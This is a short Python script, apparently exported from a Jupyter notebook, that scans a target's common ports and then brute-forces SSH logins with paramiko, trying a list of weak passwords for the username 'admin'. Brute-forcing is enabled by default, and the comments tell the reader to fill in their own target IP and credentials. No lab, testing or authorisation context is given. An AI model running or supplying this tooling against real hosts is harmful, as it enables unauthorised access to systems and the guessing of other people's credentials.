#!/usr/bin/env python
# coding: utf-8

# In[2]:


import socket
import paramiko

def port_scan(target, ports):
    results = []
    for port in ports:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        if s.connect_ex((target, port)) == 0:
            results.append(f"[+] Port {port} is open")
        s.close()
    return results

def ssh_brute_force(target, username, password_list):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    for password in password_list:
        try:
            ssh.connect(target, username=username, password=password, timeout=3)
            ssh.close()
            return f"[+] Password found: {password}"
        except:
            pass
    return "[-] No valid password found."

# Example usage (change IP and credentials accordingly)
target_ip = "192.168.1.1"  # Change to your target
print("\n".join(port_scan(target_ip, [22, 80, 443, 8080])))

brute_force = True  # Change to False if you don't want brute-force
if brute_force:
    username = "admin"
    passwords = ["password", "123456", "admin"]
    print(ssh_brute_force(target_ip, username,passwords))


# In[ ]:




